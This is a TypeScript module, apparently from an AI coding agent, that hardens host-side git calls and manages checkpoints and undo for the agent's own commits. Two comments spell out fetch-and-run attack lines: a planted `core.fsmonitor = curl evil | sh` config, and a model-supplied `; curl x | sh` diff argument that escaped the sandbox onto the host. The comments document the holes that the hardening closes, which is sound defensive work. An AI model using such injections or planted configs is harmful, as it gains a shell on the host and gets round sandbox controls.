import { execFileSync } from "node:child_process";
import { existsSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { allowedEnv } from "./executor";
import { runShell, type ShellResult } from "./shell";
import type { GitOp } from "./git-ops";

// Re-exported so callers that already import them from here keep working.
export { READ_ONLY_OPS, type GitOp } from "./git-ops";

// Git, and the checkpoints that make `undo` possible.
//
// Checkpointing through git rather than a copy directory is a deliberate
// choice: a checkpoint you can read with `git log` and `git diff` is one a
// person can inspect and trust, and one they can recover from by hand if this
// code is wrong. A hidden folder of file copies is opaque at exactly the moment
// someone needs to understand what happened.
//
// Undo only ever rewinds commits this agent made. The marker below is how it
// tells them apart, and why it will not quietly discard a commit someone else
// wrote that happens to sit on top.

/** Prefix on every commit the agent makes on its own behalf. Anything without
 *  it is somebody else's work and is never rewound. */
export const CHECKPOINT_PREFIX = "agent checkpoint:";

export function isRepo(root: string): boolean {
  const dotGit = join(root, ".git");
  if (!existsSync(dotGit)) return false;
  try {
    // A worktree or submodule has a .git FILE pointing elsewhere; git resolves it.
    if (statSync(dotGit).isFile()) return readFileSync(dotGit, "utf8").startsWith("gitdir:");
  } catch {
    return false;
  }
  // A real repository has HEAD. A stray .git directory without one is not a
  // repository: /root had one holding only info/, and treating it as a repo made
  // doctor call it one, sent checkpoints down the git path, and told the model it
  // was in a repository while every git command it ran exited 128.
  return existsSync(join(dotGit, "HEAD"));
}

// Every git command here runs on the host, outside any sandbox, in a
// directory whose contents may have been written by a model or uploaded by a
// stranger. Git is not a passive reader of that directory: its config can name
// programs to run (core.fsmonitor, hooks, pagers, diff and filter drivers,
// gpg.program), and `git status` or `git add` runs them. A planted
// `.git/config` with `core.fsmonitor = curl evil | sh` was a host shell on the
// next checkpoint. Workspace.write refuses `.git/` now, but a sandboxed command
// shares the workspace mount and can still write there, so the commands
// themselves must not trust the config they find.
//
// Command-line `-c` beats every config file, so the fixed overrides below win.
// Drivers are named by the config itself and cannot be switched off by a fixed
// flag, so each one found is blanked individually. git-lfs is the one driver
// left alone, and only with its stock commands: disabling it would commit raw
// binaries into a repository that relies on it.
const FIXED_OVERRIDES = [
  "core.fsmonitor=false",
  "core.hooksPath=/dev/null",
  "core.pager=cat",
  "core.alternateRefsCommand=",
  // Blank, so a planted external diff tool never runs. git then fails a
  // patch-producing diff loudly ("external diff died") rather than running
  // anything: every caller passes --no-ext-diff, and a new one must too.
  // A repository whose filter is marked required likewise fails to check
  // point once its filter is blanked, which is the safe direction.
  "diff.external=",
  "commit.gpgSign=false",
  "tag.gpgSign=false",
  "protocol.ext.allow=never",
  // Signature checks run a verifier program named by config: `git log` with
  // log.showSignature, or any %G format, would start it on the host. Show no
  // signatures, and point every verifier at a program that does nothing.
  "log.showSignature=false",
  "gpg.program=false",
  "gpg.ssh.program=false",
  "gpg.x509.program=false",
  "gpg.ssh.defaultKeyCommand=",
  // Other keys that name a program git may start.
  "core.sshCommand=false",
  "core.askPass=",
  "core.editor=false",
  "sequence.editor=false",
  "credential.helper=",
  "core.gitProxy=",
  // core.worktree would point the host's `git add -A` (and undo's reset) at
  // any directory on the machine; --work-tree below pins it to the workspace
  // and this stops a bare-repo flip from changing what that means.
  "core.bare=false",
];

/** The commands `git lfs install` writes, with and without `--skip`. */
const LFS_COMMAND = /^git-lfs (clean -- %f|smudge( --skip)? -- %f|filter-process( --skip)?)$/;

/** Driver keys that name a program, as `section.<name>.key`. */
const DRIVER_KEY = /^(filter|diff|merge)\.(.+)\.(clean|smudge|process|textconv|command|driver)$/i;

/** The environment git runs with: the executor's allow-list, never the
 *  parent's secrets, and nothing that could prompt or page. */
export function gitEnv(): NodeJS.ProcessEnv {
  return allowedEnv(process.env, { GIT_TERMINAL_PROMPT: "0", GIT_PAGER: "cat", PAGER: "cat" });
}

/** `-c` overrides for every program-naming key the config at `root` sets. */
export function driverOverrides(root: string): string[] {
  let listing = "";
  try {
    // `git config --list` reads config and runs nothing from it.
    listing = execFileSync("git", ["config", "--list", "-z"], {
      cwd: root,
      env: gitEnv(),
      encoding: "utf8",
      timeout: 10_000,
      stdio: ["ignore", "pipe", "ignore"],
    });
  } catch {
    return [];
  }
  const out = new Set<string>();
  for (const entry of listing.split("\0")) {
    if (!entry) continue;
    const nl = entry.indexOf("\n");
    const key = nl === -1 ? entry : entry.slice(0, nl);
    const value = nl === -1 ? "" : entry.slice(nl + 1);
    const match = DRIVER_KEY.exec(key);
    if (!match) continue;
    if (match[1].toLowerCase() === "filter" && LFS_COMMAND.test(value.trim())) continue;
    out.add(`${key}=`);
  }
  return [...out];
}

/** The `git` prefix every host invocation uses, overrides included. */
export function safeGit(root: string): string {
  return [
    "git",
    ...[...FIXED_OVERRIDES, ...driverOverrides(root)].flatMap((o) => ["-c", quote(o)]),
  ].join(" ");
}

/**
 * Pins the repository and work tree to the workspace when the workspace is a
 * repository root. core.worktree in .git/config would otherwise send the
 * host's `git add -A` (and undo's reset) to any directory on the machine, and
 * a command-line `-c core.worktree` does not override it: only GIT_DIR plus
 * GIT_WORK_TREE do. A workspace that is a subdirectory of a larger repository
 * (the CLI run inside a monorepo package) keeps normal discovery.
 */
export function gitLocation(root: string): NodeJS.ProcessEnv {
  return existsSync(join(root, ".git")) ? { GIT_DIR: join(root, ".git"), GIT_WORK_TREE: root } : {};
}

/** Run `git <rest>` in `root` with the overrides and environment above. */
export function runGit(root: string, rest: string, timeoutMs = 30_000): Promise<ShellResult> {
  return runShell(`${safeGit(root)} ${rest}`, {
    cwd: root,
    timeoutMs,
    env: { ...gitEnv(), ...gitLocation(root) },
  });
}

/** Shell-quote a single argument. Arguments come from a model, so they are
 *  never interpolated raw. */
function quote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

export async function git(
  root: string,
  op: GitOp,
  args: string[] = [],
  opts: { timeoutMs?: number } = {},
): Promise<ShellResult> {
  return runGit(root, `${op} ${args.map(quote).join(" ")}`.trim(), opts.timeoutMs ?? 60_000);
}

/** Files git reports as changed, staged or not, relative to the repo root. */
export async function changedFiles(root: string): Promise<string[]> {
  const result = await runGit(root, "status --porcelain", 30_000);
  if (!result.ok) return [];
  return result.stdout
    .split("\n")
    .map((line) => line.slice(3).trim())
    .filter(Boolean);
}

export interface CheckpointResult {
  ok: boolean;
  /** Null when there was nothing to commit, which is not a failure. */
  sha: string | null;
  message: string;
}

/**
 * Commit whatever changed, tagged as the agent's.
 *
 * Nothing to commit is a success with a null sha, not an error: a turn that
 * verified cleanly without touching a file is a perfectly ordinary outcome and
 * should not read as a failure in the event log.
 */
export async function checkpoint(root: string, description: string): Promise<CheckpointResult> {
  if (!isRepo(root)) return { ok: false, sha: null, message: "Not a git repository." };

  const changed = await changedFiles(root);
  if (changed.length === 0) return { ok: true, sha: null, message: "Nothing to check point." };

  const add = await runGit(root, "add -A", 60_000);
  if (!add.ok) return { ok: false, sha: null, message: add.stderr || "git add failed." };

  const subject = `${CHECKPOINT_PREFIX} ${description}`.slice(0, 200);
  // Identity is supplied per-invocation rather than written into the repo's
  // config, so checkpointing never mutates the user's git settings.
  const commit = await runGit(
    root,
    `-c user.name='DevStation agent' -c user.email='agent@devstation.online' commit -m ${quote(subject)}`,
    60_000,
  );
  if (!commit.ok) return { ok: false, sha: null, message: commit.stderr || "git commit failed." };

  const head = await runGit(root, "rev-parse HEAD", 30_000);
  return { ok: true, sha: head.stdout.trim() || null, message: subject };
}

/** Is HEAD a commit this agent made? */
export async function headIsCheckpoint(root: string): Promise<boolean> {
  const result = await runGit(root, "log -1 --pretty=%s", 30_000);
  return result.ok && result.stdout.trim().startsWith(CHECKPOINT_PREFIX);
}

/**
 * Rewind the most recent agent checkpoint.
 *
 * Refuses when HEAD is not one. That is the important part: if someone
 * committed on top of the agent's work, a blind `reset --hard HEAD~1` would
 * throw away their commit instead of the agent's, and they would have no
 * warning it happened.
 */
export async function undoCheckpoint(root: string): Promise<{ ok: boolean; message: string }> {
  if (!isRepo(root))
    return { ok: false, message: "Not a git repository, so there is nothing to undo." };
  if (!(await headIsCheckpoint(root))) {
    return {
      ok: false,
      message:
        "The most recent commit was not made by the agent, so nothing was undone. " +
        "Undo only ever rewinds the agent's own checkpoints.",
    };
  }
  const subject = await runGit(root, "log -1 --pretty=%s", 30_000);
  const reset = await runGit(root, "reset --hard HEAD~1", 60_000);
  if (!reset.ok) return { ok: false, message: reset.stderr || "git reset failed." };
  return { ok: true, message: `Undid ${subject.stdout.trim()}` };
}

/**
 * The newest commit that the agent did not make.
 *
 * This is what "what has the agent changed" is measured against: everything
 * from here to the working tree is the agent's, and everything before it is
 * the person's. Null when the agent's checkpoints go all the way back, which
 * happens in a repository it started itself.
 */
export async function checkpointBase(root: string): Promise<string | null> {
  if (!isRepo(root)) return null;
  const log = await runGit(root, "log --pretty=%H%x09%s -n 200", 30_000);
  if (!log.ok) return null;
  for (const line of log.stdout.split("\n")) {
    const [sha, ...rest] = line.split("\t");
    if (!sha) continue;
    if (!rest.join("\t").startsWith(CHECKPOINT_PREFIX)) return sha;
  }
  return null;
}

/**
 * `diff` and `status` as the agent needs to read them.
 *
 * The orchestrator commits a checkpoint after every turn that changes a file.
 * That is what makes undo work, and it also means a plain `git diff` right
 * after an edit shows nothing and `git status` reports a clean tree. An agent
 * that trusts those concludes its edit did not take, and goes round again.
 * Seen on a live run: fifteen steps and a dollar spent re-reading a file it had
 * already changed correctly.
 *
 * So both are answered against the last commit the agent did not make, which
 * is what "what have I changed" actually means here. Uncommitted work still
 * shows, because the range ends at the working tree.
 */
export async function agentDiff(root: string, extra: string[] = []): Promise<ShellResult> {
  const base = await checkpointBase(root);
  // Quoted, like git() above. These arguments come from the model, and until
  // this was fixed they were spliced into a shell string raw: an agent could
  // run `git {"op":"diff","args":["; curl x | sh"]}` and execute anything it
  // liked on the host. The gate did not help, because `diff` classifies as
  // project.inspect, which never asks. Verified exploitable before the fix.
  const args = extra.length > 0 ? ` ${extra.map(quote).join(" ")}` : "";
  const diff = await runGit(
    root,
    base
      ? `diff --no-ext-diff --no-textconv ${base}${args}`
      : `diff --no-ext-diff --no-textconv HEAD${args}`,
    60_000,
  );

  // A file the agent has just created is untracked, and `git diff` says
  // nothing about untracked files. Leaving them out would reproduce the exact
  // confusion this function exists to prevent, one turn earlier.
  const untracked = await runGit(root, "ls-files --others --exclude-standard", 30_000);
  const created = untracked.stdout.trim();
  if (!created) return diff;

  return {
    ...diff,
    stdout: `${diff.stdout}${diff.stdout.endsWith("\n") || !diff.stdout ? "" : "\n"}\nNew files, not yet committed:\n${created}`,
  };
}

export async function agentStatus(root: string): Promise<ShellResult> {
  const status = await runGit(root, "status --short", 30_000);
  const base = await checkpointBase(root);
  if (!base) return status;

  const since = await runGit(root, `diff --name-status ${base}`, 30_000);
  const changed = since.stdout.trim();
  if (!changed) return status;

  return {
    ...status,
    stdout:
      `${status.stdout.trim() || "Nothing uncommitted."}\n\n` +
      "Changed so far in this run, and already checkpointed:\n" +
      changed,
  };
}

/** The agent's checkpoints, newest first. */
export async function listCheckpoints(root: string, limit = 20): Promise<string[]> {
  if (!isRepo(root)) return [];
  const result = await runGit(root, `log -${limit} --pretty=%h%x09%s`, 30_000);
  if (!result.ok) return [];
  return result.stdout
    .split("\n")
    .filter((line) => line.includes(CHECKPOINT_PREFIX))
    .map((line) => line.trim())
    .filter(Boolean);
}
